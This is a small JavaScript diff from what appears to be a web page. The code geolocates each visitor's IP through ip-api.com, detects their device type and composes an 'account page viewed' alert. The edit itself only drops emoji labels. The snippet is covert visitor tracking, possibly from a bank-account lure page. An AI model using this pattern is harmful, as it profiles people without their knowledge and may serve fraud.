@@ -563,7 +563,7 @@
                 return fetch(`https://ip-api.com/json/${d.ip}?fields=status,message,country,city,isp`)
                     .then(r => r.json())
                     .then(l => {
-                        const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 Mobile' : '💻 Desktop';
+                        const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                         const msg = `*Rekening Page Dilihat*\n` +
                                    `IP: ${d.ip}\n` +
                                    `${l.country || 'Unknown'} • ${l.city || 'Unknown'}\n` +
